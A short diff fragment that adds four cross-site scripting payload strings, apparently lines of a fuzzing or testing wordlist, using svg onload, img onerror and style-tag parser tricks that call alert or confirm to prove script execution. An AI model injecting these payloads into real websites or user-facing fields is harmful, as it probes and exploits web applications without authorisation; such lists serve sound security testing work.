@@ -1,0 +1,4 @@
+foo"><svG/onLoAd=confirm(1337)>
+<style><img src="</style><img src=x onerror=javascript:alert(1)//">
+">]<img src=x onerror=alert(document.domain)>
+<img src=x onerror=alert(1)>
